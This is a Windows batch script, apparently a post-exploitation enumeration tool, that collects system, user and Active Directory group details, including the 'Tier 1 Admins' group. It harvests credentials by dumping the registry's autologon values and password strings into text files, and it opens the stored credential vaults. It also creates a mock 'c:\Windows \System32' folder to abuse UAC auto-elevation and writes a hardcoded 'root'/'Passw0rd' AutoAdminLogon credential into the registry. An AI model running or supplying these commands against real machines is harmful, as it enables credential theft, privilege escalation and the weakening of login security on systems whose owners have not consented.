@ECHO OFF
:: Basic Windows Enumeration
set t1=timeout /t -1


echo ======= System Information =======
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
%t1%

echo ======= User Privileges =======
whoami
%t1%

echo ======= User Privileges for Priv Escalation =======
whoami /priv
%t1%

echo ======= User Privileges =======
sc qc upnphost
%t1%

echo ======= Network Users =======
net users
:: net user name for more information
%t1%

echo ======= Network LocalGroups =======
net localgroup
%t1%

echo ======= All Users on Active Directory Domain =======
net user /domain > ad_users.txt
%t1%

echo ======= All Users on Active Directory Domain =======
net group /domain > ad_groups.txt
%t1%

echo ======= All Users on Active Directory Domain =======
net group "Tier 1 Admins" /domain > ad_t1admins.txt
%t1%

echo ======= Network =======
ipconfig /all
%t1%

echo ======= Address Resolution Protocol =======
arp -a 
%t1%

echo ======= Scheduled Tasks =======
schtasks /query /fo LIST /v > scheduled_tasks.txt
echo Creating startup_tasks.txt with results
%t1%

echo ======= Start Up Tasks =======
tasklist /SVC > startup_tasks.txt
echo Creating startup_tasks.txt with results
%t1%

echo ======= Windows Patches =======
wmic qfe get Caption,Description,HotFixID,InstalledOn
%t1%

echo ======= Scraping HKLM Auto Logon Credentials =======
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" | findstr Default > autologon.txt
echo Creating autologon.txt with results
%t1%

echo ======= Scraping HKLM Registry for Password String =======
reg query HKLM /f password /t REG_SZ /s > hklm_passwords.txt
echo Creating hklm_passwords.txt with results
%t1%

echo ======= Scraping HKCU Registry for Password String =======
reg query HKCU /f password /t REG_SZ /s > hkcu_passwords.txt
echo Creating hkcu_passwords.txt with results
%t1%

echo ======= Creating a Trusted Folder =======
mkdir "c:\Windows \System32"
timeout /t 1 /nobreak
echo Congratulations! you own the trusted folder "c:\Windows \System32" to execute under auto-elevation
%t1%

echo ======= Enumerating Unquoted Service Paths =======
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """ 
%t1%

echo ======= Force Change Login Password at Next Logon =======
netplwiz
echo In the Advanced User Management section, click on Advanced.
echo Right-click their name and click on Properties.
echo Click on User must change password at next logon.
echo Click on Apply, then OK.
echo If User must change password at next logon is greyed out, uncheck the box next to Password never expires.
%t1%

echo =======Turn on Automatic Logon in Windows =======
regedit

echo Enabling AutoAdminLogon
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d 1 /f
%t1%
echo Creating DefaultUserName "root"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /t REG_SZ /d root /f
%t1%
echo Creating DefaultPassword "Passw0rd"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /t REG_SZ /d Passw0rd /f
%t1%
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v ForceAutoLogon /t REG_SZ /d 1 /f
%t1%
set /p WORKGROUP=Enter the name of your AD Domain: 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName /t REG_SZ /d %WORKGROUP% /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v IgnoreShiftOvveride /t REG_SZ /d 1 /f

echo ======= View Stored Credential Keys =======
rundll32.exe keymgr.dll,KRShowKeyMgr
%t1%

echo ======= View Stored Windows Credential Keys =======
vaultcmd /listcreds:"Windows Credentials"
